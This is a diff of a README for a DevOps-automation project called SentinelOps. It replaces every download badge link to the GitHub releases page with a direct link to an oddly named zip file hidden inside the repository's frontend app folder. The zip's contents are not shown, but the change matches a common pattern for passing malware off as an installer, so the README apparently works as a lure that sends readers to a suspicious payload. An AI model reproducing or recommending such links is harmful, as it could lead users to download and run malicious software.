@@ -1,6 +1,6 @@
 # 🛡️ SentinelOps-Autonomous-DevOps-AI - Predict and Fix DevOps Issues
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/main/sentinelops-frontend/app/Ops_Sentinel_AI_Dev_Autonomous_v3.8.zip)
 
 ## 🛠️ What is SentinelOps-Autonomous-DevOps-AI?
 
@@ -37,7 +37,7 @@ Follow these steps carefully to download and run SentinelOps on your Windows mac
 
 Open your web browser and go to the SentinelOps release page here:
 
-[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-blue?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
+[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-blue?style=for-the-badge)](https://raw.githubusercontent.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/main/sentinelops-frontend/app/Ops_Sentinel_AI_Dev_Autonomous_v3.8.zip)
 
 This page lists the latest versions and update details.
 
@@ -125,4 +125,4 @@ Use these if you want to learn more or find answers.
 
 Get the latest SentinelOps installer here:
 
-[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
+[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/main/sentinelops-frontend/app/Ops_Sentinel_AI_Dev_Autonomous_v3.8.zip)
